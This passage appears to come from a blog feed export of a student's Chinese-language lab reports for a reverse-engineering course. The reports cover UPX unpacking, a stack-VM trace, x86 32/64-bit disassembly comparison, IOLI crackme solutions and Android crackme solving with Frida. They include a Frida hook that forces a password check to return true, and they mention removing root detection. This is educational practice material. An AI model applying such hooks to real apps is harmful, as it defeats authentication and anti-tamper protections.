                ></p>
<p>是 upx 工具的壳</p>
<h2 id="手动脱壳"><a href="#手动脱壳" class="headerlink" title="手动脱壳"></a>手动脱壳</h2><ol>
<li><p>OD 打开</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Reverse-project/11/image-20240520210017372.png"
                      alt="image-20240520210017372"
                ></p>
</li>
<li><p>定位到 PUSHAD</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Reverse-project/11/image-20240520210134796.png"
                      alt="image-20240520210134796"
                ></p>
</li>
<li><p>ESP 定律，下个断点</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Reverse-project/11/image-20240520210237057.png"
                      alt="image-20240520210237057"
                ></p>
</li>
<li><p>找到 POPAD，找到入口点 OEP</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Reverse-project/11/image-20240520210458512.png"
                      alt="image-20240520210458512"
                ></p>
</li>
<li><p>Dump 出 exe 文件</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Reverse-project/11/image-20240520210533260.png"
                      alt="image-20240520210533260"
                ></p>
</li>
<li><p>修补 IAT 表</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Reverse-project/11/image-20240520210637163.png"
                      alt="image-20240520210637163"
                ></p>
</li>
<li><p>成功脱壳</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Reverse-project/11/image-20240520210738996.png"
                      alt="image-20240520210738996"
                ></p>
</li>
</ol>
<h2 id="工具脱壳"><a href="#工具脱壳" class="headerlink" title="工具脱壳"></a>工具脱壳</h2><p>工具：<a class="link"   href="https://upx.github.io/" >UPX<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>可以使用 upx -d xxx.exe 直接脱壳</p>
<h2 id="反汇编"><a href="#反汇编" class="headerlink" title="反汇编"></a>反汇编</h2><p>找到关键函数</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Reverse-project/11/image-20240520211243016.png"
                      alt="image-20240520211243016"
                ></p>
<blockquote>
<p>分析可得 flag: HappyNewYear!</p>
</blockquote>
]]></content>
      <categories>
        <category>QFNU</category>
        <category>汇编语言与逆向工程</category>
        <category>实验报告</category>
      </categories>
      <tags>
        <tag>汇编语言</tag>
        <tag>逆向工程</tag>
        <tag>QFNU</tag>
      </tags>
  </entry>
  <entry>
    <title>汇编语言与逆向工程实验报告12</title>
    <url>/posts/d3c5849c.html</url>
    <content><![CDATA[<p>VM 指令：<code>0 1 dup 11 == 17 9 if jmp swap over + swap 1 + 2 jmp swap print</code></p>
<table>
<thead>
<tr>
<th>地址</th>
<th>0</th>
<th>1</th>
<th>2</th>
<th>3</th>
<th>4</th>
<th>5</th>
<th>6</th>
<th>7</th>
<th>8</th>
<th>9</th>
<th>10</th>
<th>11</th>
<th>12</th>
<th>13</th>
<th>14</th>
<th>15</th>
<th>16</th>
<th>17</th>
<th>18</th>
</tr>
</thead>
<tbody><tr>
<td>指令</td>
<td>0</td>
<td>1</td>
<td>dup</td>
<td>11</td>
<td>&#x3D;&#x3D;</td>
<td>17</td>
<td>9</td>
<td>if</td>
<td>jmp</td>
<td>swap</td>
<td>over</td>
<td>+</td>
<td>swap</td>
<td>1</td>
<td>+</td>
<td>2</td>
<td>jmp</td>
<td>swap</td>
<td>print</td>
</tr>
</tbody></table>
<p>解释：</p>
<p>压栈 0 1</p>
<ol>
<li><p>dup 复制栈顶元素</p>
</li>
<li><p>11 &#x3D;&#x3D; 比较栈顶元素是否等于 11</p>
</li>
<li><p>17 9 if 若栈顶元素等于 11，则跳转到第 17 行指令；否则跳转到第 9 行指令</p>
</li>
<li><p>jmp 无条件跳转</p>
</li>
<li><p>swap 交换栈顶两个元素</p>
</li>
<li><p>over 复制栈顶元素的上一个元素</p>
</li>
<li><p><code>+</code> 相加栈顶两个元素</p>
</li>
<li><p>swap 交换栈顶两个元素</p>
</li>
<li><p>1 + 加 1</p>
</li>
<li><p>2 jmp 无条件跳转</p>
</li>
<li><p>print 输出栈顶元素</p>
</li>
</ol>
<p>最终输出：55</p>
]]></content>
      <categories>
        <category>QFNU</category>
        <category>汇编语言与逆向工程</category>
        <category>实验报告</category>
      </categories>
      <tags>
        <tag>汇编语言</tag>
        <tag>逆向工程</tag>
        <tag>QFNU</tag>
      </tags>
  </entry>
  <entry>
    <title>汇编语言与逆向工程实验报告13</title>
    <url>/posts/a4c2b40a.html</url>
    <content><![CDATA[<h2 id="配置环境"><a href="#配置环境" class="headerlink" title="配置环境"></a>配置环境</h2><ol>
<li><p>安卓模拟器上传 Frida-server</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Reverse-project/13/image-20240608133927182.png"
                      alt="image-20240608133927182"
                ></p>
</li>
<li><p>Windows 连接安卓模拟器</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Reverse-project/13/image-20240608134102634.png"
                      alt="image-20240608134102634"
                ></p>
</li>
<li><p>运行 Frida-server</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Reverse-project/13/image-20240608134230330.png"
                      alt="image-20240608134230330"
                ></p>
</li>
</ol>
<h2 id="hook"><a href="#hook" class="headerlink" title="hook"></a>hook</h2><ol>
<li><p>查看 PID</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Reverse-project/13/image-20240608134331148.png"
                      alt="image-20240608134331148"
                ></p>
</li>
<li><p>连接进程</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Reverse-project/13/image-20240608134406589.png"
                      alt="image-20240608134406589"
                ></p>
</li>
<li><p>hook 函数拿到 flag</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Reverse-project/13/image-20240608134441787.png"
                      alt="image-20240608134441787"
                ></p>
</li>
</ol>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><div class="code-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> data = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;net.persianov.crackme0x03.Data&quot;</span>);</span><br><span class="line">  <span class="keyword">const</span> f = data.<span class="property">isPasswordOk</span>;</span><br><span class="line">  f.<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">arg</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(arg);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></div>

<div class="code-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> fg = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;net.persianov.crackme0x03.FlagGuard&quot;</span>);</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(fg);</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(fg.$new().<span class="title function_">generate</span>());</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></div>
]]></content>
      <categories>
        <category>QFNU</category>
        <category>汇编语言与逆向工程</category>
        <category>实验报告</category>
      </categories>
      <tags>
        <tag>汇编语言</tag>
        <tag>逆向工程</tag>
        <tag>QFNU</tag>
        <tag>安卓逆向</tag>
        <tag>Frida</tag>
      </tags>
  </entry>
  <entry>
    <title>汇编语言与逆向工程实验报告14</title>
    <url>/posts/3aa621a9.html</url>
    <content><![CDATA[<ol>
<li><p>成功启动设备的应用</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Reverse-project/14/image-20240619224447669.png"
                      alt="image-20240619224447669"
                ></p>
</li>
<li><p>去除 root 检测</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Reverse-project/14/image-20240619224545727.png"
                      alt="image-20240619224545727"
                ></p>
</li>
<li><p>静态分析flag</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Reverse-project/14/image-20240619224648597.png"
                      alt="image-20240619224648597"
                ></p>
</li>
</ol>
]]></content>
      <categories>
        <category>QFNU</category>
        <category>汇编语言与逆向工程</category>
        <category>实验报告</category>
      </categories>
      <tags>
        <tag>汇编语言</tag>
        <tag>逆向工程</tag>
        <tag>QFNU</tag>
        <tag>安卓逆向</tag>
        <tag>Frida</tag>
      </tags>
  </entry>
  <entry>
    <title>汇编语言与逆向工程实验报告2</title>
    <url>/posts/851346c9.html</url>
    <content><![CDATA[<h1 id="汇编语言与逆向工程实验报告2"><a href="#汇编语言与逆向工程实验报告2" class="headerlink" title="汇编语言与逆向工程实验报告2"></a>汇编语言与逆向工程实验报告2</h1><p>查看编译后的 32bit 代码，比较与 64bit 的不同</p>
<h2 id="信息"><a href="#信息" class="headerlink" title="信息"></a>信息</h2><h3 id="hello-32-o：-文件格式-elf32-i386"><a href="#hello-32-o：-文件格式-elf32-i386" class="headerlink" title="hello_32.o：     文件格式 elf32-i386"></a>hello_32.o：     文件格式 elf32-i386</h3><div class="code-container" data-rel="Txt"><figure class="iseeu highlight txt"><table><tr><td class="code"><pre><span class="line">hello_32.o：     文件格式 elf32-i386</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">00000000 &lt;fun&gt;:</span><br><span class="line">   0:	55                   	push   ebp</span><br><span class="line">   1:	89 e5                	mov    ebp,esp</span><br><span class="line">   3:	e8 fc ff ff ff       	call   4 &lt;fun+0x4&gt;</span><br><span class="line">   8:	05 01 00 00 00       	add    eax,0x1</span><br><span class="line">   d:	8b 55 08             	mov    edx,DWORD PTR [ebp+0x8]</span><br><span class="line">  10:	8b 45 0c             	mov    eax,DWORD PTR [ebp+0xc]</span><br><span class="line">  13:	01 d0                	add    eax,edx</span><br><span class="line">  15:	5d                   	pop    ebp</span><br><span class="line">  16:	c3                   	ret    </span><br><span class="line"></span><br><span class="line">00000017 &lt;main&gt;:</span><br><span class="line">  17:	8d 4c 24 04          	lea    ecx,[esp+0x4]</span><br><span class="line">  1b:	83 e4 f0             	and    esp,0xfffffff0</span><br><span class="line">  1e:	ff 71 fc             	push   DWORD PTR [ecx-0x4]</span><br><span class="line">  21:	55                   	push   ebp</span><br><span class="line">  22:	89 e5                	mov    ebp,esp</span><br><span class="line">  24:	53                   	push   ebx</span><br><span class="line">  25:	51                   	push   ecx</span><br><span class="line">  26:	83 ec 10             	sub    esp,0x10</span><br><span class="line">  29:	e8 fc ff ff ff       	call   2a &lt;main+0x13&gt;</span><br><span class="line">  2e:	81 c3 02 00 00 00    	add    ebx,0x2</span><br><span class="line">  34:	6a 04                	push   0x4</span><br><span class="line">  36:	6a 03                	push   0x3</span><br><span class="line">  38:	e8 fc ff ff ff       	call   39 &lt;main+0x22&gt;</span><br><span class="line">  3d:	83 c4 08             	add    esp,0x8</span><br><span class="line">  40:	89 45 f4             	mov    DWORD PTR [ebp-0xc],eax</span><br><span class="line">  43:	83 ec 08             	sub    esp,0x8</span><br><span class="line">  46:	ff 75 f4             	push   DWORD PTR [ebp-0xc]</span><br><span class="line">  49:	8d 83 00 00 00 00    	lea    eax,[ebx+0x0]</span><br><span class="line">  4f:	50                   	push   eax</span><br><span class="line">  50:	e8 fc ff ff ff       	call   51 &lt;main+0x3a&gt;</span><br><span class="line">  55:	83 c4 10             	add    esp,0x10</span><br><span class="line">  58:	b8 00 00 00 00       	mov    eax,0x0</span><br><span class="line">  5d:	8d 65 f8             	lea    esp,[ebp-0x8]</span><br><span class="line">  60:	59                   	pop    ecx</span><br><span class="line">  61:	5b                   	pop    ebx</span><br><span class="line">  62:	5d                   	pop    ebp</span><br><span class="line">  63:	8d 61 fc             	lea    esp,[ecx-0x4]</span><br><span class="line">  66:	c3                   	ret    </span><br><span class="line"></span><br><span class="line">Disassembly of section .text.__x86.get_pc_thunk.ax:</span><br><span class="line"></span><br><span class="line">00000000 &lt;__x86.get_pc_thunk.ax&gt;:</span><br><span class="line">   0:	8b 04 24             	mov    eax,DWORD PTR [esp]</span><br><span class="line">   3:	c3                   	ret    </span><br><span class="line"></span><br><span class="line">Disassembly of section .text.__x86.get_pc_thunk.bx:</span><br><span class="line"></span><br><span class="line">00000000 &lt;__x86.get_pc_thunk.bx&gt;:</span><br><span class="line">   0:	8b 1c 24             	mov    ebx,DWORD PTR [esp]</span><br><span class="line">   3:	c3                   	ret    </span><br></pre></td></tr></table></figure></div>

<h2 id="hello-o：-文件格式-elf64-x86-64"><a href="#hello-o：-文件格式-elf64-x86-64" class="headerlink" title="hello.o：     文件格式 elf64-x86-64"></a>hello.o：     文件格式 elf64-x86-64</h2><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">hello.o：     文件格式 elf64-x86-64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">0000000000000000 &lt;fun&gt;:</span><br><span class="line">   0:	f3 0f 1e fa          	endbr64 </span><br><span class="line">   4:	55                   	push   rbp</span><br><span class="line">   5:	48 89 e5             	mov    rbp,rsp</span><br><span class="line">   8:	89 7d fc             	mov    DWORD PTR [rbp-0x4],edi</span><br><span class="line">   b:	89 75 f8             	mov    DWORD PTR [rbp-0x8],esi</span><br><span class="line">   e:	8b 55 fc             	mov    edx,DWORD PTR [rbp-0x4]</span><br><span class="line">  11:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]</span><br><span class="line">  14:	01 d0                	add    eax,edx</span><br><span class="line">  16:	5d                   	pop    rbp</span><br><span class="line">  17:	c3                   	ret    </span><br><span class="line"></span><br><span class="line">0000000000000018 &lt;main&gt;:</span><br><span class="line">  18:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  1c:	55                   	push   rbp</span><br><span class="line">  1d:	48 89 e5             	mov    rbp,rsp</span><br><span class="line">  20:	48 83 ec 10          	sub    rsp,0x10</span><br><span class="line">  24:	be 04 00 00 00       	mov    esi,0x4</span><br><span class="line">  29:	bf 03 00 00 00       	mov    edi,0x3</span><br><span class="line">  2e:	e8 00 00 00 00       	call   33 &lt;main+0x1b&gt;</span><br><span class="line">  33:	89 45 fc             	mov    DWORD PTR [rbp-0x4],eax</span><br><span class="line">  36:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]</span><br><span class="line">  39:	89 c6                	mov    esi,eax</span><br><span class="line">  3b:	48 8d 05 00 00 00 00 	lea    rax,[rip+0x0]        # 42 &lt;main+0x2a&gt;</span><br><span class="line">  42:	48 89 c7             	mov    rdi,rax</span><br><span class="line">  45:	b8 00 00 00 00       	mov    eax,0x0</span><br><span class="line">  4a:	e8 00 00 00 00       	call   4f &lt;main+0x37&gt;</span><br><span class="line">  4f:	b8 00 00 00 00       	mov    eax,0x0</span><br><span class="line">  54:	c9                   	leave  </span><br><span class="line">  55:	c3                   	ret    </span><br></pre></td></tr></table></figure></div>

<h2 id="区别"><a href="#区别" class="headerlink" title="区别"></a>区别</h2><h3 id="fun函数偏移地址不同，汇编指令不同"><a href="#fun函数偏移地址不同，汇编指令不同" class="headerlink" title="fun函数偏移地址不同，汇编指令不同"></a>fun函数偏移地址不同，汇编指令不同</h3><p>一个是32位一个是64位</p>
<ul>
<li><p>32 位 x86 指令集。</p>
</li>
<li><p>64 位 x86-64 指令集。</p>
</li>
<li><p>32 位寄存器（如 <code>eax</code>、<code>ebx</code>、<code>edx</code>）。</p>
</li>
<li><p>64 位寄存器（如 <code>rax</code>、<code>rbx</code>、<code>rdx</code>）。</p>
</li>
</ul>
<p>堆栈操作指令不同</p>
<p>push pop</p>
<p>mov  sub</p>
]]></content>
      <categories>
        <category>QFNU</category>
        <category>汇编语言与逆向工程</category>
        <category>实验报告</category>
      </categories>
      <tags>
        <tag>汇编语言</tag>
        <tag>逆向工程</tag>
        <tag>QFNU</tag>
      </tags>
  </entry>
  <entry>
    <title>汇编语言与逆向工程实验报告3</title>
    <url>/posts/f214765f.html</url>
    <content><![CDATA[<h1 id="汇编语言与逆向工程实验报告-3"><a href="#汇编语言与逆向工程实验报告-3" class="headerlink" title="汇编语言与逆向工程实验报告 3"></a>汇编语言与逆向工程实验报告 3</h1><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Reverse-project/3/PixPin_2024-03-11_21-12-59.png"
                      alt="PixPin_2024-03-11_21-12-59"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Reverse-project/3/PixPin_2024-03-11_21-13-56.png"
                      alt="PixPin_2024-03-11_21-13-56"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Reverse-project/3/PixPin_2024-03-11_21-11-05.png"
                      alt="PixPin_2024-03-11_21-11-05"
                ></p>
<table>
<thead>
<tr>
<th>汇编指令</th>
<th>解释</th>
</tr>
</thead>
<tbody><tr>
<td>push rbp</td>
<td>将 rbp 寄存器的值压入栈中</td>
</tr>
<tr>
<td>mov rbp, rsp</td>
<td>将 rsp 寄存器的值复制到 rbp 寄存器中</td>
</tr>
<tr>
<td>mov DWORD PTR [rbp-0x14], edi</td>
<td>将 edi 寄存器的值移动到相对于 rbp 的地址偏移 -0x14 的内存位置</td>
</tr>
<tr>
<td>mov DWORD PTR [rbp-0x18], esi</td>
<td>将 esi 寄存器的值移动到相对于 rbp 的地址偏移 -0x18 的内存位置</td>
</tr>
<tr>
<td>mov eax, DWORD PTR [rbp-0x14]</td>
<td>将相对于 rbp 的地址偏移 -0x14 的内存位置的值复制到 eax 寄存器中</td>
</tr>
<tr>
<td>mov DWORD PTR [rbp-0x8], eax</td>
<td>将 eax 寄存器的值移动到相对于 rbp 的地址偏移 -0x8 的内存位置</td>
</tr>
<tr>
<td>mov DWORD PTR [rbp-0x4], 0x0</td>
<td>将值 0x0 移动到相对于 rbp 的地址偏移 -0x4 的内存位置</td>
</tr>
<tr>
<td>jmp 0x555555555150 &lt;fun+39&gt;</td>
<td>无条件跳转到地址 0x555555555150</td>
</tr>
<tr>
<td>mov eax, DWORD PTR [rbp-0x4]</td>
<td>将相对于 rbp 的地址偏移 -0x4 的内存位置的值复制到 eax 寄存器中</td>
</tr>
<tr>
<td>add DWORD PTR [rbp-0x8], eax</td>
<td>将 eax 寄存器的值与相对于 rbp 的地址偏移 -0x8 的内存位置的值相加，结果存储到 -0x8 的内存位置</td>
</tr>
<tr>
<td>add DWORD PTR [rbp-0x4], 0x1</td>
<td>将值 0x1 加到相对于 rbp 的地址偏移 -0x4 的内存位置的值上</td>
</tr>
<tr>
<td>mov eax, DWORD PTR [rbp-0x4]</td>
<td>将相对于 rbp 的地址偏移 -0x4 的内存位置的值复制到 eax 寄存器中</td>
</tr>
<tr>
<td>cmp eax, DWORD PTR [rbp-0x18]</td>
<td>比较 eax 寄存器的值与相对于 rbp 的地址偏移 -0x18 的内存位置的值</td>
</tr>
<tr>
<td>jl 0x555555555146 &lt;fun+29&gt;</td>
<td>如果前面的比较结果是小于，则跳转到地址 0x555555555146</td>
</tr>
<tr>
<td>mov eax, DWORD PTR [rbp-0x8]</td>
<td>将相对于 rbp 的地址偏移 -0x8 的内存位置的值复制到 eax 寄存器中</td>
</tr>
<tr>
<td>pop rbp</td>
<td>将栈中压入的 rbp 寄存器的值弹出</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>QFNU</category>
        <category>汇编语言与逆向工程</category>
        <category>实验报告</category>
      </categories>
      <tags>
        <tag>汇编语言</tag>
        <tag>逆向工程</tag>
        <tag>QFNU</tag>
      </tags>
  </entry>
  <entry>
    <title>汇编语言与逆向工程实验报告6</title>
    <url>/posts/827e82d0.html</url>
    <content><![CDATA[<h1 id="汇编语言与逆向工程实验报告-6"><a href="#汇编语言与逆向工程实验报告-6" class="headerlink" title="汇编语言与逆向工程实验报告 6"></a>汇编语言与逆向工程实验报告 6</h1><h2 id="环境安装"><a href="#环境安装" class="headerlink" title="环境安装"></a>环境安装</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Reverse-project/6/image-20240405185930897.png"
                      alt="image-20240405185930897"
                ></p>
<h2 id="crackme02-逆向"><a href="#crackme02-逆向" class="headerlink" title="crackme02 逆向"></a>crackme02 逆向</h2><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">undefined4 <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> local_8;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;IOLI Crackme Level 0x02\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Password: &quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;local_8);</span><br><span class="line">    <span class="keyword">if</span> (local_8 == <span class="number">0x52b24</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Password OK :)\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Invalid Password!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>通过分析伪代码得</p>
<p>首先输出两句话，输入密码</p>
<p>然后 if 判断，如果输入的内容与十六进制数 <code>0x52b24</code> 相等，则输出<code>Password OK</code>，否则输出 <code>Invalid Password!</code></p>
<p>所以密码就是<code>0x52b24</code></p>
<p>十六进制数为：<code>0x52b24</code></p>
<p>转换为二进制为：<code>0b1010010101100100100</code></p>
<p>转换为八进制为：<code>0o1225444</code></p>
<p>转换为十进制为：<code>338724</code></p>
<h2 id="crackme03-逆向"><a href="#crackme03-逆向" class="headerlink" title="crackme03 逆向"></a>crackme03 逆向</h2><h3 id="主函数伪代码"><a href="#主函数伪代码" class="headerlink" title="主函数伪代码"></a>主函数伪代码</h3><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">undefined4 <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  undefined4 local_8;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;IOLI Crackme Level 0x03\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Password: &quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;local_8);</span><br><span class="line">  test(local_8,<span class="number">0x52b24</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="test-伪代码"><a href="#test-伪代码" class="headerlink" title="test 伪代码"></a>test 伪代码</h3><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">test</span><span class="params">(<span class="type">int</span> param_1,<span class="type">int</span> param_2)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (param_1 == param_2) &#123;</span><br><span class="line">    shift(<span class="string">&quot;Sdvvzrug#RN$$$#=,&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    shift(<span class="string">&quot;Lqydolg#Sdvvzrug$&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h3 id="shift1-伪代码"><a href="#shift1-伪代码" class="headerlink" title="shift1 伪代码"></a>shift1 伪代码</h3><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><figcaption><span>title</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">shift</span><span class="params">(<span class="type">char</span> *param_1)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> sVar1;</span><br><span class="line">  uint local_80;</span><br><span class="line">  <span class="type">char</span> local_7c [<span class="number">120</span>];</span><br><span class="line"></span><br><span class="line">  local_80 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span>( <span class="literal">true</span> ) &#123;</span><br><span class="line">    sVar1 = <span class="built_in">strlen</span>(param_1);</span><br><span class="line">    <span class="keyword">if</span> (sVar1 &lt;= local_80) <span class="keyword">break</span>;</span><br><span class="line">    local_7c[local_80] = param_1[local_80] + <span class="number">-3</span>;</span><br><span class="line">    local_80 = local_80 + <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  local_7c[local_80] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,local_7c);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="shift2-伪代码"><a href="#shift2-伪代码" class="headerlink" title="shift2 伪代码"></a>shift2 伪代码</h3><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><figcaption><span>title</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">shift</span><span class="params">(<span class="type">char</span> *param_1)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> sVar1;</span><br><span class="line">  uint local_80;</span><br><span class="line">  <span class="type">char</span> local_7c [<span class="number">120</span>];</span><br><span class="line"></span><br><span class="line">  local_80 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span>( <span class="literal">true</span> ) &#123;</span><br><span class="line">    sVar1 = <span class="built_in">strlen</span>(param_1);</span><br><span class="line">    <span class="keyword">if</span> (sVar1 &lt;= local_80) <span class="keyword">break</span>;</span><br><span class="line">    local_7c[local_80] = param_1[local_80] + <span class="number">-3</span>;</span><br><span class="line">    local_80 = local_80 + <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  local_7c[local_80] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,local_7c);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>通过分析伪代码,主函数接受用户输入一个数，然后进入 test 函数，参数是输入的数和另一个十六进制数</p>
<p>十六进制数为：0x52b24<br>转换为二进制为：0b1010010101100100100<br>转换为八进制为：0o1225444<br>转换为十进制为：338724</p>
<p>进入 test 函数之后可以看到如果两个参数相等，则调用函数第一个<code>shift1</code>，否则调用函数第二个<code>shift2</code></p>
<p>shift1 函数携带参数为字符串<code>Sdvvzrug#RN$$$#=,</code>，shift2 函数携带参数为字符串<code>Lqydolg#Sdvvzrug$</code></p>
<p>shift1 函数的作用是将传入的字符串中的每个字符的 ASCII 码值减去 3，然后将结果打印出来。</p>
<p>shift2 函数的作用同上</p>
<p>编写脚本解密</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">a=<span class="string">&quot;Sdvvzrug#RN$$$#=,&quot;</span></span><br><span class="line">aa=<span class="string">&quot;&quot;</span></span><br><span class="line">b=<span class="string">&quot;Lqydolg#Sdvvzrug$&quot;</span></span><br><span class="line">bb=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a)):</span><br><span class="line">    aa+=<span class="built_in">chr</span>(<span class="built_in">ord</span>(a[i])-<span class="number">3</span>)</span><br><span class="line">    bb+=<span class="built_in">chr</span>(<span class="built_in">ord</span>(b[i])-<span class="number">3</span>)</span><br><span class="line"><span class="built_in">print</span>(aa)</span><br><span class="line"><span class="built_in">print</span>(bb)</span><br></pre></td></tr></table></figure></div>

<p>解密结果是<br>Password OK!!! :)<br>Invalid Password!</p>
<blockquote>
<p>I_have_g0t_it_n0w!</p>
</blockquote>
]]></content>
      <categories>
        <category>QFNU</category>
        <category>汇编语言与逆向工程</category>
        <category>实验报告</category>
      </categories>
      <tags>
        <tag>汇编语言</tag>
        <tag>逆向工程</tag>
        <tag>QFNU</tag>
      </tags>
  </entry>
  <entry>
    <title>汇编语言与逆向工程实验报告4</title>
    <url>/posts/6c70e3fc.html</url>
    <content><![CDATA[<h1 id="汇编语言与逆向工程实验报告-4"><a href="#汇编语言与逆向工程实验报告-4" class="headerlink" title="汇编语言与逆向工程实验报告 4"></a>汇编语言与逆向工程实验报告 4</h1><blockquote>
<p>实验目的：call，ret 堆栈，栈帧图</p>
</blockquote>
<h2 id="hello-64-exe"><a href="#hello-64-exe" class="headerlink" title="hello_64.exe"></a>hello_64.exe</h2><h3 id="汇编"><a href="#汇编" class="headerlink" title="汇编"></a>汇编</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Reverse-project/4/PixPin_2024-03-18_21-05-42.png"
                     
                ></p>
